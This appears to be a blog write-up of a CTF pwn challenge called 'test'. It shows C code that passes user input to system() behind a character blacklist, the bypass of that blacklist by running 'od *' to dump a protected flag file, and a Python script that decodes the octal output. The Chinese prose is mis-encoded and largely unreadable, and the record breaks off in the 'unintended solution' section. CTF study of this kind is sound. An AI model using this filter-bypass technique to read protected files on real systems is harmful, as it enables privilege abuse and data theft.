<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Ev3r"><meta name="copyright" content="Ev3r"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>BJDCTF 2nd-test | Ev3r's blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"example.com","root":"/","title":"Ev3r","version":"1.5.2","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æƒ³è¦æœä»€ä¹ˆï¼Œæ¥è¿™é‡Œ","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=UA-121354150-1"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-121354150-1');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="one gadget å’Œ r2t3å·²ç»å•ç‹¬å†™äº†ï¼Œè®°å½•ä¸€ä¸‹å¤ç°é‡åˆ°çš„æœ‰æ„æ€çš„é¢˜ç›® testè¿™ä¸ªé¢˜ç›®å¾ˆæœ‰æ„æ€ï¼Œè€ƒå¯ŸlinuxåŸºç¡€å§  pwnä¹Ÿèƒ½é‡åˆ°ç»•wafï¼Œï¼Œï¼Œ è™šæ‹Ÿæœºé“¾æ¥ä¸ä¸Šbuuæ˜¯æ€ä¹ˆå›äº‹  linuxåŸºç¡€çš„ä¸€äº›è¿ç”¨è¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚é¦–å…ˆsshé“¾æ¥ä¸Šè¿œç¨‹ä¸»æœºã€‚cat flagè¿è¡Œå¤±è´¥ã€‚ç„¶åçœ‹äº†ä¸€ä¸‹test.cæ–‡ä»¶ int main()&amp;#123;     char cmd[0x100] &#x3D; &amp;#1">
<meta property="og:type" content="article">
<meta property="og:title" content="BJDCTF 2nd-test">
<meta property="og:url" content="http://example.com/2021/03/30/test/index.html">
<meta property="og:site_name" content="Ev3r&#39;s blog">
<meta property="og:description" content="one gadget å’Œ r2t3å·²ç»å•ç‹¬å†™äº†ï¼Œè®°å½•ä¸€ä¸‹å¤ç°é‡åˆ°çš„æœ‰æ„æ€çš„é¢˜ç›® testè¿™ä¸ªé¢˜ç›®å¾ˆæœ‰æ„æ€ï¼Œè€ƒå¯ŸlinuxåŸºç¡€å§  pwnä¹Ÿèƒ½é‡åˆ°ç»•wafï¼Œï¼Œï¼Œ è™šæ‹Ÿæœºé“¾æ¥ä¸ä¸Šbuuæ˜¯æ€ä¹ˆå›äº‹  linuxåŸºç¡€çš„ä¸€äº›è¿ç”¨è¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚é¦–å…ˆsshé“¾æ¥ä¸Šè¿œç¨‹ä¸»æœºã€‚cat flagè¿è¡Œå¤±è´¥ã€‚ç„¶åçœ‹äº†ä¸€ä¸‹test.cæ–‡ä»¶ int main()&amp;#123;     char cmd[0x100] &#x3D; &amp;#1">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2021-03-30T12:01:57.000Z">
<meta property="article:modified_time" content="2021-04-24T07:48:07.002Z">
<meta property="article:author" content="Ev3r">
<meta property="article:tag" content="BJDCTF 2ndå¤ç°">
<meta name="twitter:card" content="summary"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info mickey-mouse"><a class="site-author-avatar" href="/about/" title="Ev3r"><img width="96" loading="lazy" src="/images/head.jpg" alt="Ev3r"><span class="site-author-status" title="nothing for pwn">ğŸ™‚</span></a><div class="site-author-name"><a href="/about/">Ev3r</a></div><span class="site-name">Ev3r's blog</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="æˆ‘çš„ä¸»é¡µ"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">48</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">22</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/myenid?tab=repositories" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://ctf-wiki.org/pwn/readme/" title="Wiki" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/504533786" title="å“”å“©å“”å“©åŠ¨ç”»" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" target="_blank" rel="noopener" href="https://mlysoft.cn/cross.html" title="jså¸ˆå‚…" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#test"><span class="toc-number">1.</span> <span class="toc-text">test</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-number">1.1.</span> <span class="toc-text">é¢„æœŸ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">1.2.</span> <span class="toc-text">éé¢„æœŸ</span></a></li></ol></li></ol></div></div></div><div class="tag-cloud"><div class="tag-cloud-tags"><a href="/tags/BJDCTF-2nd%E5%A4%8D%E7%8E%B0/" style="font-size: 21px; color: #4d89c0">BJDCTF 2ndå¤ç°</a> <a href="/tags/Linux/" style="font-size: 16.5px; color: #7391ad">Linux</a> <a href="/tags/Nep2021/" style="font-size: 12px; color: #999">Nep2021</a> <a href="/tags/SROP/" style="font-size: 25.5px; color: #2680d4">SROP</a> <a href="/tags/UAF/" style="font-size: 25.5px; color: #2680d4">UAF</a> <a href="/tags/debug/" style="font-size: 12px; color: #999">debug</a> <a href="/tags/libc%E6%B3%84%E9%9C%B2/" style="font-size: 16.5px; color: #7391ad">libcæ³„éœ²</a> <a href="/tags/off-by-one%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/" style="font-size: 12px; color: #999">off_by_oneåŸç†å’Œåˆ©ç”¨</a> <a href="/tags/orw%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/" style="font-size: 12px; color: #999">orwç³»ç»Ÿè°ƒç”¨</a> <a href="/tags/shellcode/" style="font-size: 25.5px; color: #2680d4">shellcode</a> <a href="/tags/tcache/" style="font-size: 12px; color: #999">tcache</a> <a href="/tags/unlink/" style="font-size: 12px; color: #999">unlink</a> <a href="/tags/vm%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%81%94%E7%BD%91/" style="font-size: 12px; color: #999">vmè™šæ‹Ÿæœºè”ç½‘</a> <a href="/tags/web/" style="font-size: 16.5px; color: #7391ad">web</a> <a href="/tags/%E6%80%BB%E7%BB%93/" style="font-size: 21px; color: #4d89c0">æ€»ç»“</a> <a href="/tags/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1/" style="font-size: 12px; color: #999">æ‹Ÿæ€é˜²å¾¡</a> <a href="/tags/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/" style="font-size: 12px; color: #999">æ•°ç»„è¶Šç•Œ</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 30px; color: #0078e7">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" style="font-size: 12px; color: #999">ç¯å¢ƒé…ç½®</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 25.5px; color: #2680d4">ç®—æ³•</a></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://example.com/2021/03/30/test/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Ev3r"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Ev3r's blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">BJDCTF 2nd-test<a class="post-edit-link" href="https://github.com/myenid/myenid.github.io_posts/test.md" target="_blank" title="ç¼–è¾‘" rel="noopener"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-edit-line"></use></svg></a></h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-30 20:01:57" itemprop="dateCreated datePublished" datetime="2021-03-30T20:01:57+08:00">2021-03-30</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2021-04-24 15:48:07" itemprop="dateModified" datetime="2021-04-24T15:48:07+08:00">2021-04-24</time></div><span class="leancloud_visitors" id="/2021/03/30/test/" data-flag-title="BJDCTF 2nd-test"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="è¯„è®ºæ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-chat-3-line"></use></svg> <span class="waline-comment-count" id="/2021/03/30/test/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">æ¯”èµ›å¤ç°</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/BJDCTF-2nd%E5%A4%8D%E7%8E%B0/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">BJDCTF 2ndå¤ç°</span></a></span></div><div class="post-author"><span class="author-name">Ev3r</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><p> <font color="###qwe">one gadget å’Œ r2t3å·²ç»å•ç‹¬å†™äº†ï¼Œè®°å½•ä¸€ä¸‹å¤ç°é‡åˆ°çš„æœ‰æ„æ€çš„é¢˜ç›®</font></p>
<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>è¿™ä¸ªé¢˜ç›®å¾ˆæœ‰æ„æ€ï¼Œè€ƒå¯ŸlinuxåŸºç¡€å§</p>
<blockquote>
<p>pwnä¹Ÿèƒ½é‡åˆ°ç»•wafï¼Œï¼Œï¼Œ</p>
<p>è™šæ‹Ÿæœºé“¾æ¥ä¸ä¸Šbuuæ˜¯æ€ä¹ˆå›äº‹</p>
</blockquote>
<p>linuxåŸºç¡€çš„ä¸€äº›è¿ç”¨è¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚é¦–å…ˆsshé“¾æ¥ä¸Šè¿œç¨‹ä¸»æœºã€‚cat flagè¿è¡Œå¤±è´¥ã€‚ç„¶åçœ‹äº†ä¸€ä¸‹test.cæ–‡ä»¶</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> cmd<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to Pwn-Game by TaQini."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your ID:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"$ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"u"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"s"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"h"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"l"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"|"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"$"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">)</span>
       <span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h3><p>æœ‰ç‚¹ä¸œè¥¿ï¼Œè¿‡æ»¤äº†è®¸å¤šè‹±æ–‡å­—æ¯å’Œæ ‡ç‚¹ï¼Œç„¶åæŸ¥çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆå‘½ä»¤èƒ½å¤Ÿä½¿ç”¨ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ctf@39a4ac42fc00:~$ <span class="token function">ls</span> /usr/bin/ /bin/ <span class="token operator">|</span> <span class="token function">grep</span> -v -E <span class="token string">"n|e|p|b|u|s|h|i|f|l|a|g"</span>
<span class="token function">dd</span>
kmod
mt
<span class="token function">mv</span>
<span class="token function">rm</span>

2to3
2to3-2.7
2to3-3.4
<span class="token punctuation">[</span>
<span class="token function">comm</span>
od
<span class="token function">tr</span>
<span class="token function">tty</span>
w
<span class="token function">wc</span>
x86_64
xxd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¸ˆå‚…ä»¬ä½¿ç”¨äº†odå‘½ä»¤ï¼Œå°±çœ‹åˆ°äº†ï¼ŒçœŸçš„è½ã€‚</p>
<p><strong>odæŒ‡ä»¤ä¼šè¯»å–æ‰€ç»™äºˆçš„æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†å…¶å†…å®¹ä»¥å…«è¿›åˆ¶å­—ç å‘ˆç°å‡ºæ¥ã€‚</strong></p>
<p>è¯¦ç»†çš„çœ‹é“¾æ¥</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-od.html">https://www.runoob.com/linux/linux-comm-od.html</a></p>
<p>ç„¶å</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ctf@39a4ac42fc00:~$ od -t c /flag
od: /flag: No such <span class="token function">file</span> or directory
ctf@39a4ac42fc00:~$ od -t c /flag
od: flag: Permission denied
ctf@39a4ac42fc00:~$ ./test
Welcome to Pwn-Game by TaQini.
Your ID:
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span> <span class="token assign-left variable">egid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ctf_pwn<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span>
$ od
*
^Cctf@39a4ac42fc00:~$ ./test
Welcome to Pwn-Game by TaQini.
Your ID:
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span> <span class="token assign-left variable">egid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>ctf_pwn<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>ctf<span class="token punctuation">)</span>
$ od *
0000000 066146 063541 063173 060543 060460 063141 026546 033062
0000020 030541 032055 062141 026470 062141 031146 032455 061464
0000040 062067 062543 031546 063062 076543 077412 046105 001106
0000060 000401 000000 000000 000000 000000 001000 037000 000400
0000100 000000 000000 040006 000000 000000 040000 000000 000000
0000120 000000 014000 000033 000000 000000 000000 000000 040000
0000140 034000 004400 040000 017400 016000 003000 000000 002400
0000160 000000 040000 000000 000000 000000 040000 040000 000000
0000200 000000 040000 040000 000000 000000 <span class="token number">174000</span> 000001 000000
0000220 000000 <span class="token number">174000</span> 000001 000000 000000 004000 000000 000000
0000240 000000 001400 000000 002000 000000 034000 000002 000000
0000260 000000 034000 040002 000000 000000 034000 040002 000000
0000300 000000 016000 000000 000000 000000 016000 000000 000000
0000320 000000 000400 000000 000000 000000 000400 000000 002400
0000340 000000 000000 000000 000000 000000 000000 040000 000000
0000360 000000 000000 040000 000000 000000 <span class="token number">132000</span> 000013 000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åå†™è„šæœ¬ï¼Œçœ‹ä¸€ä¸‹flagçš„å…«è¿›åˆ¶æ˜¯ä»€ä¹ˆï¼Œå†å»æ¯”å¯¹ï¼Œæœ€åå†è½¬åŒ–ç›¸åº”çš„å†…å®¹ä¸ºflag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii
tmp <span class="token operator">=</span> <span class="token string">"066146 063541 030573 062062 034060 031066 026462 032461 061145 032055 061142 026461 032541 060543 061055 034470 033463 061464 063061 031545 076544 077412 046105 001106 000401"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">try</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
	<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
		<span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>è¿™ä¸ªå°±å¾ˆç„äº†ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ctf@39a4ac42fc00:~$ ./test
Welcome to Pwn-Game by TaQini.
Your ID:
